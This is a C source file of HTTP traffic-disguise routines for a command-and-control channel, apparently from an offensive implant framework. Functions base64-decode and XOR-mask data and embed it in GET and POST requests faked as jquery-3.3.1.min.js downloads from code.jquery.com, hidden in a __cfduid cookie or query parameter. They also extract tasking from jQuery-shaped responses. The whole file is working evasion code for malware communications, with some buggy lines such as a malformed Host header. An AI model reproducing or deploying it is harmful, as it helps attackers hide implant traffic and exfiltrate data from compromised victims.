#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

static const char *BASE64_STR_CODE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const short BASE64_INT_CODE[] = {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
                                        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
                                        -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1,
                                        -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
                                        17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30,
                                        31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
                                        51};
static const short BASE64_INT_LENGTH = sizeof(BASE64_INT_CODE) / sizeof(BASE64_INT_CODE[0]);

void base64_decode_to_ascii(char *base64Str, long res[]) {
    int i = 0;
    int j = 0;
    int v1 = 0;
    int v2 = 0;
    int v3 = 0;
    int base64StrLength = strlen(base64Str);

    for (i = 0; i < base64StrLength; ++i) {
        char ascii = base64Str[i];
        if (ascii == 0x20 | ascii == '\n' | ascii == '\t') {
            break;
        } else {
            if (ascii == '=') {
                ++v3;
                v1 <<= 6;
                ++v2;
                switch (v2) {
                    case 1:
                    case 2:
                        return;
                    case 3:
                        break;
                    case 4:
                        res[j++] = (char) (v1 >> 16);
                        if (v3 == 1) {
                            res[j++] = (char) (v1 >> 8);
                        }
                        break;
                    case 5:
                        return;
                    default:
                        return;
                }
            } else {
                if (v3 > 0) {
                    return;
                }

                if (ascii >= 0 && ascii < BASE64_INT_LENGTH) {
                    short v4 = BASE64_INT_CODE[ascii];
                    if (v4 >= 0) {
                        v1 = (v1 << 6) + v4;
                        ++v2;
                        if (v2 == 4) {
                            res[j++] = (char) (v1 >> 16);
                            res[j++] = (char) (v1 >> 8 & 255);
                            res[j++] = (char) (v1 & 255);
                            v1 = 0;
                            v2 = 0;
                        }
                        continue;
                    }
                }

                if (ascii == 0x20 | ascii == '\n' | ascii == '\t') {
                    return;
                }
            }
        }
    }
}

void ascii_to_base64_encode(long ascii[], unsigned long asciiLength, char res[]) {
    long i = 0;
    long j = 0;
    long v1 = 0;
    long v2 = 0;
    long v3 = 0;
    long v6 = 0;

    for (i = 0; i < asciiLength; ++i) {
        v6 = ascii[v1++];
        if (v6 < 0) {
            v6 += 256;
        }

        v2 = (v2 << 8) + v6;
        ++v3;
        if (v3 == 3) {
            res[j++] = BASE64_STR_CODE[v2 >> 18];
            res[j++] = BASE64_STR_CODE[v2 >> 12 & 63];
            res[j++] = BASE64_STR_CODE[v2 >> 6 & 63];
            res[j++] = BASE64_STR_CODE[v2 & 63];
            v2 = 0;
            v3 = 0;
        }
    }

    if (v3 > 0) {
        if (v3 == 1) {
            res[j++] = BASE64_STR_CODE[v2 >> 2];
            res[j++] = BASE64_STR_CODE[v2 << 4 & 63];
            res[j++] = (unsigned char) '=';
        } else {
            res[j++] = BASE64_STR_CODE[v2 >> 10];
            res[j++] = BASE64_STR_CODE[v2 >> 4 & 63];
            res[j++] = BASE64_STR_CODE[v2 << 2 & 63];
        }
        res[j] = (unsigned char) '=';
    }
}

unsigned long get_base64_decode_length(char *base64Str) {
    long num;
    long base64StrLength = strlen(base64Str);
    if (strstr(base64Str, "==")) {
        num = base64StrLength / 4 * 3 - 2;
    } else if (strstr(base64Str, "=")) {
        num = base64StrLength / 4 * 3 - 1;
    } else {
        num = base64StrLength / 4 * 3;
    }
    return sizeof(unsigned char) * num;
}

unsigned long get_base64_encode_length(long strLen) {
    long num;
    if (strLen % 3 == 0) {
        num = strLen / 3 * 4;
    } else {
        num = (strLen / 3 + 1) * 4;
    }
    return sizeof(unsigned char) * num;
}

void mask_decode(long ascii[], unsigned long asciiLength, long res[]) {
    long i = 0;
    long j = 0;
    short key[4] = {
            ascii[0],
            ascii[1],
            ascii[2],
            ascii[3]
    };
    for (i = 4; i < asciiLength; ++i) {
        res[j] = ascii[i] ^ key[j % 4];
        j++;
    }
}

void mask_encode(long ascii[], unsigned long asciiLength, long res[]) {
    long i = 0;
    srand(time(NULL));
    short key[4] = {
            (char) (rand() % 255),
            (char) (rand() % 255),
            (char) (rand() % 255),
            (char) (rand() % 255)
    };
    res[0] = key[0];
    res[1] = key[1];
    res[2] = key[2];
    res[3] = key[3];
    for (i = 4; i < asciiLength; i++) {
        res[i] = ascii[i - 4] ^ key[i % 4];
    }
}

char *fix_reverse(char *str) {
    int i = 0;
    unsigned long strLength = strlen(str);
    char *res = calloc(strLength + 4, strLength + 4);
    for (i = 0; i < strLength; ++i) {
        if (str[i] == '_') {
            res[i] = '/';
        } else if (str[i] == '-') {
            res[i] = '+';
        } else {
            res[i] = str[i];
        }
    }
    while (strlen(res) % 4 != 0) {
        res[strLength++] = '=';
    }
    res[strlen(res) + 1] = '\0';
    return res;
}

char *fix(char *str) {
    int i;
    unsigned long strLength = strlen(str);
    char *res = calloc(strLength, strLength);
    for (i = 0; i < strLength; i++) {
        if (str[i] == '/') {
            res[i] = '_';
        } else if (str[i] == '+') {
            res[i] = '-';
        } else if (str[i] == '=') {
            continue;
        } else {
            res[i] = str[i];
        }
    }
    return res;
}

char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {
    rawData = strstr(rawData, start) + strlen(start);

    *payload_len = strlen(rawData) - strlen(strstr(rawData, end));

    char *payload = (char *) calloc(*payload_len, sizeof(char));
    memcpy(payload, rawData, *payload_len);
    return payload;
}

char *cc2_rebind_http_post_send_param(char *data) {
    unsigned long base64DecodeLength = get_base64_decode_length(data);

    long base64DecodeRes[base64DecodeLength];
    memset(base64DecodeRes, 0, base64DecodeLength);
    base64_decode_to_ascii(data, base64DecodeRes);

    long maskEncodeRes[base64DecodeLength + 4];
    memset(maskEncodeRes, 0, base64DecodeLength + 4);
    mask_encode(base64DecodeRes, base64DecodeLength + 4, maskEncodeRes);

    unsigned long base64EncodeLength = get_base64_encode_length(sizeof(maskEncodeRes) / sizeof(maskEncodeRes[0]));
    char *result = calloc(base64EncodeLength, base64EncodeLength);
    ascii_to_base64_encode(maskEncodeRes, base64DecodeLength + 4, result);

    return result;
}

char *cc2_rebind_http_recv_param(char *payload) {
    char *data = fix_reverse(payload);

    unsigned long base64DecodeLength = get_base64_decode_length(data);
    long base64DecodeRes[base64DecodeLength];
    memset(base64DecodeRes, 0, base64DecodeLength);
    base64_decode_to_ascii(data, base64DecodeRes);

    long maskDecodeRes[base64DecodeLength - 4];
    memset(maskDecodeRes, 0, base64DecodeLength - 4);
    mask_decode(base64DecodeRes, base64DecodeLength, maskDecodeRes);

    unsigned long base64EncodeLength = get_base64_encode_length(base64DecodeLength - 4);
    char *result = calloc(base64EncodeLength, base64EncodeLength);
    ascii_to_base64_encode(maskDecodeRes, base64DecodeLength - 4, result);

    return result;
}

void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {
    char *requestBody = "GET /%s HTTP/1.1\r\n"
                        "Host: code.jquery.comr\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"
                        "Cookie: __cfduid=%s\r\n"
                        "Referer: http://code.jquery.com/\r\n"
                        "Connection: close\r\n\r\n";

    char postPayload[20000];
    sprintf(postPayload, requestBody, "jquery-3.3.1.min.js", reqData);

    *outputData_len = strlen(postPayload);
    *outputData = (char *) calloc(1, *outputData_len);
    memcpy(*outputData, postPayload, *outputData_len);
}

void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {
    char *requestBody = "POST /%s?__cfduid=%s HTTP/1.1\r\n"
                        "Host: code.jquery.com\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"
                        "Referer: http://code.jquery.com/\r\n"
                        "Connection: close\r\n"
                        "Content-Length: %d\r\n\r\n%s";

    id = cc2_rebind_http_post_send_param(id);
    reqData = cc2_rebind_http_post_send_param(reqData);

    char *postPayload = (char *) calloc(1, strlen(requestBody) + strlen(reqData) + 200);

    sprintf(postPayload, requestBody, "jquery-3.3.2.min.js", id, strlen(reqData), reqData);
    *outputData_len = strlen(postPayload);
    *outputData = (char *) calloc(1, *outputData_len);

    memcpy(*outputData, postPayload, *outputData_len);
    free(postPayload);
}

void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
    char *start = "return-1},P=\"\r";
    char *end = "\".(o=t.documentElement";

    long long payload_len = 0;
    char *payload = find_payload(rawData, rawData_len, start, end, &payload_len);

    *outputData = cc2_rebind_http_recv_param(payload);
    *outputData_len = strlen(*outputData);
}

void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
    char *start = "return-1},P=\"\r";
    char *end = "\".(o=t.documentElement";

    long long payload_len = 0;
    char *payload = find_payload(rawData, rawData_len, start, end, &payload_len);

    *outputData = cc2_rebind_http_recv_param(payload);
    *outputData_len = strlen(*outputData);
}